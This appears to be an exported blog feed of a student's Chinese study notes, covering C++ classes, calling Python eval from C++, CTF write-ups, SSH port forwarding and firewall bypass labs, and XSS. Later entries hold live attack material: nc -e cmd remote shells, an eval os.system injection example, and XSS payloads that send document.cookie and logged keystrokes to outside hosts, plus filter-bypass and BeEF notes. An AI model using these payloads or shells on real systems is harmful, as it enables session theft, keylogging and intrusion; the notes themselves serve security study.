called"&lt;&lt;endl;&#125;&#125;;int main()&#123; Ctest array[2]; cout&lt;&lt;"End Main"&lt;&lt;endl; return 0;&#125; 析构函数和运算符delete delete运算导致析构函数调用12345Ctest *pTest;pTest = new Ctest;//构造函数调用delete pTest; //析构函数调用pTest = new Ctest[3]; //构造函数调用3次delete[] pTest; //析构函数调用3次 构造函数和析构函数调用时机12345678910111213141516171819202122232425262728class Demo &#123; int id;public: Demo( int i ) &#123; id = i; cout&lt;&lt;"id="&lt;&lt;id&lt;&lt;"Constructed"&lt;&lt;endl; &#125; ~Demo() &#123; cout&lt;&lt;"id="&lt;&lt;id&lt;&lt;"Destructed"&lt;&lt;endl; &#125;&#125;;Demo d1(1);void Func()&#123; static Demo d2(2); Demo d3(3); cout&lt;&lt;"Func"&lt;&lt;endl;&#125;int main()&#123; Demo d4(4); d4 = 6; cout&lt;&lt;"main"&lt;&lt;endl; &#123; Demo d5(5);&#125; Func(); cout&lt;&lt;"main ends"&lt;&lt;endl; return 0;&#125; 12345678910111213141516输出:id=1 Constructedid=4 Constructedid=6 Constructedid=6 Destructedmainid=5 Constructedid=5 Destructedid=2 Constructedid=3 ConstructedFuncid=3 Destructedmain endsid=6 Destructedid=2 Destructedid=1 Destructed 静态成员变量和静态成员函数 静态成员:在说明前加了static关键字的成员12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394class CRectangle&#123; private: int w,h; static int nTotalArea; //静态成员变量 static int nTotalNumber; public: CRectangle(int w_,int h_); ~CRectangle(); static void PrintTotal();//静态成员函数&#125;;普通成员变量每个对象有各自的一份,而静态成员变量一共就一份,为所有对象共享.sizeof运算符不会计算静态成员变量```cppclass CMyclass&#123; int n; static int s;&#125;;sizeof(CMyclass)等于4普通成员变量每个对象有各自的一份,而静态成员变量一共就一份,为所有对象共享.普通成员函数必须具体作用于某个对象,而静态成员函数并不具体作用与某个对象.因此静态成员不需要通过对象就能访问.### 如何访问静态成员1. 类名::成员名 CRectangle::PrintTotal();2. 对象名.成员名 CRectangle r;r.PrintTotal();3. 指针-&gt;成员名 CRectangle *p = &amp;r; p-&gt;PrintTotal();4. 引用.成员名 CRectangle &amp; ref = r; int n = ref.nTotalNumber;* 静态成员变量本质上是全局变量,哪怕一个对象都不存在,类的静态成员变量也存在.* 静态成员函数本质上是全局函数.* 设置静态成员这种脊椎的目的时将和某些类紧密相关的全局变量和函数写到类里面,看上去像一个整体,易于维护和理解.考虑一个需要随时知道矩形总数和总面积的图形处理程序,可以用全局变量来记录总数和总面积,用静态成员将这两个变量封装进类中.```cppclass CRectangle&#123; private: int w,h; static int nTotalArea; static int nTotalNumber; public: CRectangle(int w_,int h_); ~CRectangle(); static void PrintTotal();&#125;;CRectangle::CRectangle(int w_,int h_)&#123; w = w_; h = h_; nTotalNumber++; nTotalArea += w * h;&#125;CRectangle::~CRectangle()&#123; nTotalNumber--; nTotalArea -= w * h;&#125;void CRectangle::PrintTotal()&#123; cout&lt;&lt;nTotalNumber&lt;&lt;","&lt;&lt;nTotalArea&lt;&lt;endl;&#125;int CRectangle::nTotalNumber = 0;int CRectangle::nTotalArea = 0;//必须在定义类的文件中对静态成员变量进行一次说明//或初始化,否则编译能通过,链接不能通过.int main()&#123; CRectangle r1(3,3),r2(2,2); //cout&lt;&lt;CRectangle::nTotalNumber; wrong private CRectangle::PrintTotal(); r1.PrintTotal(); return 0;&#125;* 在静态成员函数中,不能访问非静态成员变量,也不能调用非静态成员函数.在使用CRectangle类时，有时会调用复制构造函数生成临时的隐藏的CRectangle对象调用一个以CRectangle类对象作为参数的函数时，调用一个以CRectangle类对象作为返回值的函数时临时对象在消亡时会调用析构函数，减少nTotalNumber 和nTotalArea的值，可是这些临时对象在生成时却没有增加nTotalNumber 和 nTotalArea的值。解决方法:写一个复制构造函数```cppCRectangle::CRectangel(CRectangle &amp; r)&#123; w=r.w; h=r.h; nTotalNumber++; nTotalArea+=w*h;&#125; 成员对象和封闭类 成员对象:一个类的成员变量时另一个类的对象 包含成员对象的类叫封闭类(Enclosing)12345678910111213141516171819202122class CTyre&#123; private: int radius; int width; public: CTyre(int r,int w):radius(r),width(w)&#123;&#125;&#125;;class CEngine&#123;&#125;;class CCar&#123; private: int price; CTyre tyre; CEngine engine; public: CCar(int p, int tr, int tw);&#125;;CCar::CCar(int p, int tr, int w):price(p), tyre(tr, w)&#123;&#125;;int main()&#123; CCar car(20000,17,225); return 0;&#125; 如果CCar类不定义构造函数,则 CCar car;//编译出错编译器不知道 car.tyre 该如何初始化car.engine 的初始化没有问题:用默认构造函数生成封闭类对象的语句 明确对象中的成员对象 封闭类构造函数的初始化列表 定义封闭类的构造函数时,添加初始化列表类名::构造函数(参数表):成员变量1(参数表),成员变量2(参数表){} 成员对象初始化列表中的参数 任意复杂的表达式 函数/变量/表达式中的函数,变量有定义 调用顺序当封闭类对象生成时,• S1: 执行所有成员对象 的构造函数• S2: 执行 封闭类 的构造函数成员对象的构造函数调用顺序• 和成员对象在类中的说明顺序一致• 与在成员初始化列表中出现的顺序无关当封闭类的对象消亡时,• S1: 先执行 封闭类 的析构函数• S2: 执行 成员对象 的析构函数析构函数顺序和构造函数的调用顺序相反 12345678910111213141516171819202122class CTyre &#123;public:CTyre() &#123; cout &lt;&lt; "CTyre contructor" &lt;&lt; endl; &#125;~CTyre() &#123; cout &lt;&lt; "CTyre destructor" &lt;&lt; endl; &#125;&#125;;class CEngine &#123;public:CEngine() &#123; cout &lt;&lt; "CEngine contructor" &lt;&lt; endl; &#125;~CEngine() &#123; cout &lt;&lt; "CEngine destructor" &lt;&lt; endl; &#125;&#125;;class CCar &#123;private:CEngine engine;CTyre tyre;public:CCar( ) &#123; cout &lt;&lt; “CCar contructor” &lt;&lt; endl; &#125;~CCar() &#123; cout &lt;&lt; "CCar destructor" &lt;&lt; endl; &#125;&#125;;int main()&#123;CCar car;return 0;&#125; 1234567程序的输出结果是：CEngine contructorCTyre contructorCCar contructorCCar destructorCTyre destructorCEngine destructor 友元(Friend)友元函数 一个类的友元函数可以访问该类的私有成员 123456789101112131415161718192021222324252627class CCar;class CDriver&#123; public: void ModifyCar(CCar * pCar); &#125;;class CCar&#123; private: int price; friend int MostEXpensiveCar(CCar cars[], int total); friend void CDriver::ModifyCar(CCar * pCar);&#125;;void CDriver::ModifyCar(CCar * pCar)&#123; pCar-&gt;price += 1000;&#125;int MostExpensiveCar(CCar cars[], int total)&#123; int tmpMax = -1; for(int i = 0; i &lt; total; ++i) if( cars[i].price &gt; tmpMax) tmpMax = cars[i].price; return tmpMax;&#125;int main()&#123; return 0;&#125; 将一个类的成员函数(包括构造,析构函数)-&gt;另一个类的友元 1234567class B&#123; public: void function();&#125;;class A&#123; friend void B::function();&#125;; 友元类 A是B的友元类-&gt;A的成员函数可以访问B的私有成员12345678910111213class CCar&#123; private: int price; friend class CDriver;//声明CDriver为友元类&#125;;class CDriver&#123; public: CCar myCar; void ModifyCar()&#123;//改装汽车 myCar.price += 1000;//CDriver是CCar的友元类-&gt;可以访问其私有成员 &#125;&#125;;int main()&#123;return 0;&#125; 友元类之间的关系不能传递,不能继承 this指针 C++程序到C程序的翻译12345678910111213class CCar&#123; public: int price; void SetPrice(int p);&#125;;void CCar::SetPrice(int p)&#123; price = p;&#125;int main()&#123; CCar car; car.SetPrice(20000); return 0;&#125; 12345678910struct CCar&#123; int price;&#125;;void SetPrice(struct CCar * this, int p)&#123; this-&gt;price = p;&#125;int main()&#123; struct CCar car; SetPrice(&amp; car, 20000); return 0;&#125; this指针作用其作用就是指向成员函数所作用的对象非静态成员函数中可以直接使用this来代表指向该函数作用的对象的指针 1234567891011121314151617class Complex&#123; public: double real,imag; void Print()&#123; cout&lt;&lt;real&lt;&lt;","&lt;&lt;imag;&#125; Complex(double r,double i):real(r),imag(i) &#123;&#125; Complex AddOne()&#123; this-&gt;real++; //等价于 real++; this-&gt;Print();//等价于Print return *this; &#125;&#125;;int main()&#123; Complex c1(1,1),c2(0,0); c2 = c1.AddOne(); return 0;&#125;//输出2,1 this指针作用 1234567891011class A&#123; int i;public: void Hello()&#123;cout&lt;&lt;"hello"&lt;&lt;endl;&#125;&#125;;//void Hello(A * this)&#123; cout&lt;&lt;"hello"&lt;&lt;endl;&#125;int main()&#123; A * p = NULL; p-&gt;Hello();//Hello(p);&#125; 输出hello123456789101112class A&#123; int i; public: void Hello()&#123;cout&lt;&lt;i&lt;&lt;"hello"&lt;&lt;endl;&#125; &#125;;//void Hello(A * this)&#123; cout&lt;&lt;this-&gt;i&lt;&lt;"hello"&lt;&lt;endl;&#125; //this若为NULL,则出错 int main() &#123; A * p = NULL; p-&gt;Hello();//Hello(p); &#125; this指针和静态成员函数静态成员函数中不能使用this指针,因为静态成员函数并不具体作用于某个对象,因此,静态成员函数的真实的参数的个数,就是程序中写出的参数个数. 常量对象,常量成员函数和常引用常量对象如果不希望某个对象的值被改变,则定义该对象的时候可以在前面加const关键字1234567class Demo&#123; private: int value; public: void SetValue()&#123;&#125;&#125;;const Demo obj; 常量成员函数在类的成员函数说明后面可以加const关键字,则该成员函数成为常量成员函数.常量成员函数执行期间不应修改其所作用的对象,因此,在常量成员函数中不能修改成员变量的值(静态成员变量除外),也不能调用同类的非常量成员函数(静态成员函数除外).1234567891011121314151617181920class Sample&#123;public: int value; void GetValue() const; void func()&#123;&#125;; Sample()&#123;&#125;&#125;;void Sample::GetValue() const&#123; value = 0;//wrong func();//wrong&#125;int main() const Sample o; o.value = 100; //err.常量对象不可被修改 o.func();//err.常量对象上不可执行非常量成员函数 o.GetValue();//ok,常量对象上可以执行常量成员函数 return 0;&#125; 常量成员函数的重载两个成员函数,名字和参数表都一样,但是一个是const,一个不是,算重载.1234567891011121314class CTest&#123; private: int n; public: CTest()&#123;n = 1;&#125; int GetValue() const &#123;return n;&#125; int GetValue() &#123; return 2*n;&#125;&#125;;int main()&#123; const CTest objTest1; CTest objTest2; cout&lt;&lt;objTest1.GetValue()&lt;&lt;"."&lt;&lt;objTest2.GetValue(); return 0;&#125; 常引用引用前面可以加const关键字,成为常引用.不能通过常引用,修改其引用的变量.]]></content>
  </entry>
  <entry>
    <title><![CDATA[C++调用Python]]></title>
    <url>%2F2018%2F05%2F25%2FC-%E8%B0%83%E7%94%A8Python%2F</url>
    <content type="text"><![CDATA[为了实现一个C++调用python eval函数，实验成功，但是只是能运行，安全问题很大。12345678910def get_int(): a = 10 b = 20 return a + bdef get_str(s1): #return eval(s1) # s3 = s1+s2 s4 = str(eval(s1)) return (s4,10,20) 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869#include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;Python.h&gt; int main() &#123; PyObject *pName, *pModule, *pDict, *pFunc, *pArgs, *pRetVal; Py_Initialize(); if (!Py_IsInitialized()) return -1; //load py script filename PyRun_SimpleString("import sys"); PyRun_SimpleString("sys.path.append('./')"); pName = PyString_FromString("py_test");// py_test.py pModule = PyImport_Import(pName); if (!pModule)&#123; printf("cant find py_test.py"); getchar(); return -1; &#125; pDict = PyModule_GetDict(pModule); if (!pDict) return -1; //find function name pFunc = PyDict_GetItemString(pDict, "get_str"); if (!pFunc || !PyCallable_Check(pFunc))&#123; printf("cant find function [add]"); getchar(); return -1; &#125; //push args to stack // pArgs = PyTuple_New(2); // PyTuple_SetItem(pArgs, 0, Py_BuildValue("s", "1+")); // PyTuple_SetItem(pArgs, 1, Py_BuildValue("s", "2")); pArgs = PyTuple_New(1); PyTuple_SetItem(pArgs, 0, Py_BuildValue("s", "3* 2+ 32 //6")); // PyTuple_SetItem(pArgs, 1, Py_BuildValue("s", "2")); //call python function pRetVal = PyObject_CallObject(pFunc, pArgs); if (pRetVal == NULL)&#123; printf("CalllObject return NULL"); return -1; &#125; char* ret_str; int w = 0 , h = 0; //解析元组 PyArg_ParseTuple(pRetVal, "s,i,i",&amp;ret_str,&amp;w,&amp;h); printf("%s\n", ret_str); //解析字符串 // printf("function return value:%s\r\n", PyString_AsString(pRetVal)); Py_DECREF(pName); Py_DECREF(pArgs); Py_DECREF(pModule); Py_DECREF(pRetVal); //close python Py_Finalize(); return 0; &#125; g++ callpy1.cpp -o callpy1 -I/usr/include/python2.7 -L/usr/lib/ -lpython2.7 可以把程序改成获取用户输入的表达式，然后由C++调用python的eval函数进行执行。这样就会很明显的出现，如果对输入没有进行过滤，很简单就可以执行系统命令。eval(&#39;__imort__(&quot;os&quot;).system(&quot;dir&quot;)&#39;)那么怎么过滤和怎么绕过过滤就是有时间需要研究的了。又开一个坑。]]></content>
  </entry>
  <entry>
    <title><![CDATA[64位Linux编译32位程序]]></title>
    <url>%2F2018%2F05%2F22%2F64%E4%BD%8DLinux%E7%BC%96%E8%AF%9132%E4%BD%8D%E7%A8%8B%E5%BA%8F%2F</url>
    <content type="text"><![CDATA[在编译下面这个程序的时候，我希望能够既能32位编译测试又能64位编译测试，简单折腾一下就OK了。记个笔记。123456789101112131415161718192021222324252627282930313233343536373839404142434445//StackFrame.c#include &lt;stdio.h&gt;#include &lt;string.h&gt;struct Strt&#123; int member1; int member2; int member3;&#125;;#define PRINT_ADDR(x) printf("&amp;"#x" = %p\n", &amp;x)int StackFrameContent(int para1, int para2, int para3)&#123; int locVar1 = 1; int locVar2 = 2; int locVar3 = 3; int arr[] = &#123;0x11,0x22,0x33&#125;; struct Strt tStrt = &#123;0&#125;; PRINT_ADDR(para1); //若para1为char或short型，则打印para1所对应的栈上整型临时变量地址！ PRINT_ADDR(para2); PRINT_ADDR(para3); PRINT_ADDR(locVar1); PRINT_ADDR(locVar2); PRINT_ADDR(locVar3); PRINT_ADDR(arr); PRINT_ADDR(arr[0]); PRINT_ADDR(arr[1]); PRINT_ADDR(arr[2]); PRINT_ADDR(tStrt); PRINT_ADDR(tStrt.member1); PRINT_ADDR(tStrt.member2); PRINT_ADDR(tStrt.member3); return 0;&#125;int main(void)&#123; int locMain1 = 1, locMain2 = 2, locMain3 = 3; PRINT_ADDR(locMain1); PRINT_ADDR(locMain2); PRINT_ADDR(locMain3); StackFrameContent(locMain1, locMain2, locMain3); printf("[locMain1,2,3] = [%d, %d, %d]\n", locMain1, locMain2, locMain3); memset(&amp;locMain2, 0, 2*sizeof(int)); printf("[locMain1,2,3] = [%d, %d, %d]\n", locMain1, locMain2, locMain3); return 0;&#125; 64位Ubuntu的编译运行情况。12345678910111213141516171819&amp;locMain1 = 0x7ffd444399dc&amp;locMain2 = 0x7ffd444399e0&amp;locMain3 = 0x7ffd444399e4&amp;para1 = 0x7ffd4443998c&amp;para2 = 0x7ffd44439988&amp;para3 = 0x7ffd44439984&amp;locVar1 = 0x7ffd44439994&amp;locVar2 = 0x7ffd44439998&amp;locVar3 = 0x7ffd4443999c&amp;arr = 0x7ffd444399ac&amp;arr[0] = 0x7ffd444399ac&amp;arr[1] = 0x7ffd444399b0&amp;arr[2] = 0x7ffd444399b4&amp;tStrt = 0x7ffd444399a0&amp;tStrt.member1 = 0x7ffd444399a0&amp;tStrt.member2 = 0x7ffd444399a4&amp;tStrt.member3 = 0x7ffd444399a8[locMain1,2,3] = [1, 2, 3][locMain1,2,3] = [1, 0, 0] 那么32位的编译需要做以下的工作。 确认打开多构架dpkg --print-foreign-architectures出现结果：i386, 就已经打开了。 打开多构架支持功能 123sudo dpkg --add-architecture i386sudo apt-get updatesudo apt-get dist-upgrade 完成之后再输入sudo apt-get install gcc-multilib g++-multilib 编译命令gcc test.c -m32 最后32位的编译运行结果 12345678910111213141516171819&amp;locMain1 = 0xff8e84c0&amp;locMain2 = 0xff8e84c4&amp;locMain3 = 0xff8e84c8&amp;para1 = 0xff8e84b0&amp;para2 = 0xff8e84b4&amp;para3 = 0xff8e84b8&amp;locVar1 = 0xff8e8478&amp;locVar2 = 0xff8e847c&amp;locVar3 = 0xff8e8480&amp;arr = 0xff8e8490&amp;arr[0] = 0xff8e8490&amp;arr[1] = 0xff8e8494&amp;arr[2] = 0xff8e8498&amp;tStrt = 0xff8e8484&amp;tStrt.member1 = 0xff8e8484&amp;tStrt.member2 = 0xff8e8488&amp;tStrt.member3 = 0xff8e848c[locMain1,2,3] = [1, 2, 3][locMain1,2,3] = [1, 0, 0]]]></content>
  </entry>
  <entry>
    <title><![CDATA[3道CTF题的尝试]]></title>
    <url>%2F2018%2F05%2F20%2F3%E9%81%93CTF%E9%A2%98%E7%9A%84%E5%B0%9D%E8%AF%95%2F</url>
    <content type="text"><![CDATA[今天碰到了两道CTF题，解出来了一道，整理一下思路，也算学到了新东西。 trojan这道题题目很简单，就是说工程师发现一个远控木马的客户端程序，请分析该远程控制木马的控制端IP及端口号。 这道题附件下载下来是一个DAT文件，这我之前也没见过。但是感觉就是一个可执行文件。果然后缀改成.exe之后图标都显示出来了。 那么思路其实也很清晰，要不然就逆向，要不然就抓包。逆向太麻烦了，就抓包了。用了wireshark，干扰的包太多，就没成功。那么我在想是不是有一款工具可以监测某个进程的网络通信情况呢，刚好我就找到了这样一款软件。AntiSpy，是一款行为监控工具。那么我在虚拟机里运行了木马之后，就可以在AntiSpy软件的网络选项卡中看到本地地址本地端口和远程地址远程端口。这道题就成功解决了。中间发现了一个小技巧，疑似可执行文件可以拖到DetectItEasy里面看一下。 图片隐写还是熟悉的套路，把图片文件binwalk一下，发现末尾是有一个rar的。那么把rar分离出来。分离出来发现rar是有密码的。rar中有四个txt文件，每个TXT的大小是六个字节。那么我很自然的想到应该是CRC32爆破。那么弄出来python代码暴力开始破123456789101112131415161718192021222324252627282930#!/usr/bin/env python # -*- coding:utf-8 -*- import datetimeimport binasciidef showTime(): print datetime.datetime.now().strftime("%H:%M:%S")def crack(): crcs = set([0x91E7241F, 0x94DD44AA, 0x69320A89,0x9F23DB71]) r = xrange(65, 91) for a in r: for b in r: for c in r: for d in r: for e in r: for f in r: txt = chr(a)+chr(b)+chr(c)+chr(d)+chr(e)+chr(f) crc = binascii.crc32(txt) if (crc &amp; 0xFFFFFFFF) in crcs: print(txt)if __name__ == "__main__": showTime() crack() showTime() 12345678910111213141516#!/usr/bin/env python import binascii dic = r"CTF&#123;&#125;ctflg" for x1 in dic: for x2 in dic: for x3 in dic: for x4 in dic: for x5 in dic: for x6 in dic: s = x1+x2+x3+x4+x5+x6 crc = binascii.crc32(s)&amp;0xFFFFFFFF if (crc==0x91E7241F or crc==0x94DD44AA or crc==0x69320A89 or crc==0x9F23DB71): print hex(crc),s 但是跑起来发现不是很现实，一是很慢，二是跑出来的你不知道是不是答案。https://www.lammertbies.nl/comm/info/crc-calculation.html?crc=12345&amp;method=ascii一个验证CRC32的网站那么思路就卡死在这了，等WP出来。那我想是不是正向可以破解，有时间就把hashcat 破解不同文件的密码好好研究一下。还有就是压缩包的伪加密 base64其实还有昨天碰到的一道Base64,昨天是没有什么思路。今天知道怎么做的了。 AV9SB3ZLX3VFYMFIEQ== 就是观察全是大写字母，对于base64不太对。那么其中的一些是小写字母，通过穷举解决，有时间要搞透base64编码。]]></content>
  </entry>
  <entry>
    <title><![CDATA[SSH简单应用]]></title>
    <url>%2F2018%2F05%2F14%2FSSH%E7%AE%80%E5%8D%95%E5%BA%94%E7%94%A8%2F</url>
    <content type="text"><![CDATA[SSH 本地端口转发将一本地端口与远程服务器建立隧道简单介绍一下这次的配置情况，一样是有一个只能出站53端口的防火墙，内网一台Linux机器作为ssh客户端，外网有一台kali开启ssh。2003 IP：10.10.10.130Kali IP：10.10.10.144 首先配置一下Kali环境。修改ssh的配置文件1234/etc/ssh/sshd_configPermitRootLogin yesPort 53PasswordAuthentication yes service ssh startnetstat -pantu | grep :53service ssh restart 内网Linux配置SSH本地端口转发ssh -fCNg -L &lt;listen port&gt;:&lt;remote ip&gt;:&lt;remote port&gt;user@&lt;ssh server&gt;-p&lt;ssh server port&gt;ssh -L 7001:10.10.10.130:80 root@10.10.10.144 -p 53http://127.0.0.1:7001就可以看到2003机器80端口的网页 如果不是2003开启网页服务而是Kali本身开启网页服务，尝试一下。service apache2 start建立一条新的隧道ssh -fCNg -L &lt;listen port&gt;:localhost:&lt;remote port&gt; user@&lt;ssh server&gt; -p &lt;ssh port&gt;ssh -CfN -L 7002:localhost:80 root@10.10.10.144 -p 53http://127.0.0.1:7002 就可以看到kali的web server 那么再试一下远程桌面ssh -CfN -L 7003:10.10.10.130:3389 root@10.10.10.144 -p 53rdesktop 127.0.0.1:7003 -f 后台运行进程-N 不执行登陆SHELL-g 复用访问时作为网关，支持多主机访问本地侦听端口网关模式转发RDP，NC shellssh -CfNg -L 7004:10.10.10.130:3389 root@10.10.10.144 -p 53这样之后再在内网开一台XP虚拟机。可以通过mstsc，连接1.1.1.3:7004，连接到2003的远程桌面。 nc shell在这个场景下，把Kali和Linux只充当一个ssh隧道。然后XP和2003之间nc流量通过这个SSH隧道。2003：nc -nvlp 3333XP : nc 1.1.1.3:7005 -e cmdLinux : ssh -CfNg -L 7005:10.10.10.130:3333 root@10.10.10.144 -p 53 端口转发基于建立起来的SSH隧道，隧道中断则端口转发中断只能在建立隧道时创建转发，不能为已有隧道增加端口转发 SSH 远程端口转发 由于ACL等原因，SSH与应用连接建立方向相反 本地端口转发 SSH客户端 + 应用客户端位于FW一段 SSH服务端 + 应用服务端位于另一端 远程端口转发 SSH客户端，应用客户端位于FW两端 SSH服务端，应用服务端位于FW两端`ssh -fNg -R :: user@ -p 之所以称为远程，是因为SSH侦听端口开在远程的SSH server上 侦听端口永远开在应用客户端一方ssh -CfNg -R 7001:1.1.1.2:80 root@10.10.10.144 -p 53ssh -CfNg -R 7001:1.1.1.2:3389 root@10.10.10.144 -p 53在kali上 http://127.0.0.1:7001 可以看到XPweb SSH 动态端口转发 本地，远程端口转发都需要固定应用服务器IP，Port 应用端口繁多，逐个转发效率低 某些应用不固定端口 某些网站不支持IP直接访问 使用非受信网络上网时保护流量不被嗅探 本地侦听Socks4/5代理端口 由SSH server决定如何转发 作为翻墙代理使用 配置客户端代理（浏览器） 使用proxychains支持无代理客户端 ssh -CfNg -D 7001 root@1.1.1.1 -p 53X 协议转发 远程登陆Linux GUI运行图形化界面工具 VNC X Windows 防火墙限制访问时 基于SSH的X转发 ssh -X user@1.1.1.1 -p 53]]></content>
  </entry>
  <entry>
    <title><![CDATA[一次简单的流量重定向]]></title>
    <url>%2F2018%2F05%2F12%2F%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84%E6%B5%81%E9%87%8F%E9%87%8D%E5%AE%9A%E5%90%91%2F</url>
    <content type="text"><![CDATA[简单的流量重定向首先简单介绍一下这个配置的具体情况。以下配置全在VM虚拟机下进行。有四台机器，一台XP，一台kali，一台win2003，还有一个m0n0wall。XP在内网环境下，通过m0n0wall过滤连接外网。只打开外出的53端口，所以无法正常访问网页。Kali用来流量重定向，监听53端口，并把流量转发win2003的80端口。win2003配置IIS。 m0n0wall首先是配置m0n0wall的部分，一开始就碰到问题，m0n0wall的安装镜像都找不到。应该是很早就停止维护了，最后的版本大概是在2014年。我也没怎么找替代品，看到一个smallwall，但好像也停止维护了，就没有仔细研究。那么找了半天，我终于找到了m0n0wall的最后一个版本，并在虚拟机上进行了安装。安装过程很快，虚拟机的配置需要给它两块网卡，一块是Host Only,另一块就是联外网的。那么进入以后其实很简单，它就只有6个选项。第一个选项配置一下网卡，第二个选项设置一下LAN IP address。第三个选项重置webGUI的密码。剩下没什么可做的了。这里要注意一个问题，卡了我一下。就是需要将虚拟网络编辑器里的使用本地DHCP服务将IP地址分配给虚拟机这个选项关掉。这样XP才能由monowall的DHCP服务来分配地址。接下来就是进入webGUI里面进行设置，图形化界面也十分简单。目的很简单，就是只允许53端口的出站请求。以上完成之后，防火墙的部分就配置好了。 KaliKali的部分是用Rinetd来进行流量的重定向。首先安装Rinetd。apt-get install rinetdrinetd的配置文件cat /etc/rinetd.conf配置的时候输入本机IP，侦听的53端口，2003的IP，80端口。运行服务rinetd查看启动没有ps aux | grep rinetdnetstat -pantu | grep :53 win2003这里因为之前就配置了IIS服务，运行appwiz.cpl。其实就是开一个网页作为示范。就不细说了。不过可以修改一下密码方便之后的远程桌面12cd\net user administrator * winXPXP没有什么需要配置的，它只有一块HOST ONLY网卡，被防火墙卡了以后就只有53端口的流量可以出去。如果之前的配置都成功的话。那么通过浏览器访问`http://10.10.10.144:53/发现就可以看到win2003 80端口的网页。说明流量重定向成功。 远程桌面网页OK以后再来尝试一下远程桌面。首先需要打开win2003的远程桌面服务。然后改变流量转发的端口，不再转发到80端口，而是3389端口。修改完成之后需要重新启动rinetd。pkill rinetdrinetd在XP上运行mstsc NC重定向获得SHELL首先在kali里面是有windows版的NC，具体在/usr/share/windows-binaries/nc.exe复制到XP以及2003在2003中，侦听333端口 nc -nvlp 333端口转发也需要改成333端口在XP中 nc 10.10.10.144 53 -e cmd即可把cmd交给远程的2003]]></content>
  </entry>
  <entry>
    <title><![CDATA[XSS漏洞等笔记]]></title>
    <url>%2F2018%2F04%2F23%2FXSS%E6%BC%8F%E6%B4%9E%E7%AD%89%E7%AC%94%E8%AE%B0%2F</url>
    <content type="text"><![CDATA[XSS 攻击web客户端 客户端脚本语言 弹窗告警，广告 JavaScript 在浏览器中执行 XSS（cross-site scripting) 通过web站点漏洞，向客户端交付恶意脚本代码，实现对客户端的攻击的目的 注入客户端脚本代码 盗取cookie 重定向 VBScript, ActiveX or Flash JavaScript 与Java语言无关 命名完全出于市场原因 使用最广的客户端脚本语言 使用场景 直接嵌入html：&lt;script&gt; alert(‘XSS’); &lt;/script&gt; 元素标签事件：&lt;body onload=alert(‘XSS’)&gt; 图片标签：&lt;img src=&quot;javascript:alert(&#39;XSS&#39;);&quot;&gt; 其他标签：&lt;iframe&gt;, &lt;div&gt;, and &lt;link&gt; DOM对象，篡改页面内容 攻击参与方 攻击者 被攻击者 漏洞站点 第三方站点（攻击目标，攻击参与站） 漏洞形成的根源 服务器对用户提交数据过滤不严 提交给服务器的脚本被直接返回给其他客户端执行 脚本在客户端执行恶意操作 XSS漏洞类型 存储型（持久型） 反射型（非持久） DOM型 漏洞PoC 123456789&lt;script&gt;alert(‘xss’)&lt;/script&gt;&lt;a href='' onclick=alert('xss')&gt;type&lt;/a&gt;&lt;img src=http://1.1.1.1/a.ipg onerror=alert('xss')&gt;&lt;script&gt;window.location=‘http://1.1.1.1'&lt;/script&gt;&lt;iframe SRC="http://1.1.1.1/victim" height = "0" width ="0"&gt;&lt;/iframe&gt;&lt;script&gt;new Image().src="http://1.1.1.1/c.php?output="+document.cookie;&lt;/script&gt;&lt;script&gt;document.body.innerHTML="&lt;div style=visibility:visible;&gt;&lt;h1&gt;THISWEBSITE IS UNDER ATTACK&lt;/h1&gt;&lt;/div&gt;";&lt;/script&gt; 窃取cookie &lt;script src=http://1.1.1.1/a.js&gt;&lt;/script&gt; a.js 12var img = new Image();img.src = "http://1.1.1.1/cookies.php?cookie="+document.cookie; keylogger.js 1234567891011document.onkeypress = function(evt) &#123;evt = evt || window.eventkey = String.fromCharCode(evt.charCode)if (key) &#123;var http = new XMLHttpRequest();var param = encodeURI(key)http.open("POST","http://192.168.20.8/keylogger.php",true);http.setRequestHeader("Content-type","application/x-www-form-urlencoded");http.send("key="+param); &#125;&#125; Xsser 命令行/图形化工具 绕过服务器端输入筛选 10进制/16进制编码 unescape() xsser -u “http://1.1.1.1/dvwa/vulnerabilities/&quot; -g &quot;xss_r/?name=&quot; --cookie=&quot;security=low; PHPSESSID=d23e469411707ff8210717e67c521a81&quot; -s -v --reverse-check –heuristic 检查被过滤的字符 对payload编码，绕过服务器端筛选过滤–Str Use method String.FromCharCode()–Une Use Unescape() function–Mix Mix String.FromCharCode() and Unescape()–Dec Use Decimal encoding–Hex Use Hexadecimal encoding–Hes Use Hexadecimal encoding, with semicolons–Dwo Encode vectors IP addresses in DWORD–Doo Encode vectors IP addresses in Octal–Cem=CEM Try -manually- different Character Encoding Mutations(reverse obfuscation: good) -&gt; (ex: ‘Mix,Une,Str,Hex’) 注入技术（多选）–Coo Cross Site Scripting Cookie injection–Xsa Cross Site Agent Scripting–Xsr Cross Site Referer Scripting–Dcp Data Control Protocol injections–Dom Document Object Model injections–Ind HTTP Response Splitting Induced code–Anchor Use Anchor Stealth payloader (DOM shadows!)–Phpids PHP - Exploit PHPIDS bug (0.6.5) to bypass filters–Doss XSS Denial of service (server) injection–Dos XSS Denial of service (client) injection–B64 Base64 code encoding in META tag (rfc2397)–Onm ONM - Use onMouseMove() event to inject code–Ifr Use source tag to inject code 存储型XSS 长期存储于服务器端 每次用户访问都会被执行javascript脚本 Name：客户端表单长度限制 客户端，截断代理 &lt;script src=http://1.1.1.1/a.js&gt;&lt;/script&gt; a.js源码 12var img = new Image();img.src = "http://1.1.1.1:88/cookies.php?cookie="+document.cookie; DOM型XSS 一套JS和其他语言可调用的标准的API &lt;script&gt;var img=document.createElement(&quot;img&quot;);img.src=&quot;http://192.168.20.8:88/log?&quot;+escape(document.cookie);&lt;/script&gt; BEEF 浏览器攻击面 应用普遍转移到B/S架构，浏览器成为统一客户端程序 结合社会工程学方法对浏览器进行攻击 攻击浏览器用户 通过注入的JS脚本，利用浏览器攻击其他网站 BEEF（Browser exploitation framework) 生成、交付payload Ruby 语言编写 服务器端：管理hooked客户端 客户端：运行于客户端浏览器的JavaScript脚本 攻击手段 利用网站XSS漏洞实现攻击 诱使客户端访问含有hook的伪造站点 结合中间人攻击注入hook脚本 常见用途 键盘记录器 网络扫描 浏览器信息收集 绑定shell 与metasploit集成 演示页面：http://&lt;IP_BeEF_Server&gt;:3000/demos/basic.html Details: 浏览器、插件版本信息；操作系统信息 Logs: 浏览器动作：焦点变化、鼠标点击、信息输入 Commands: 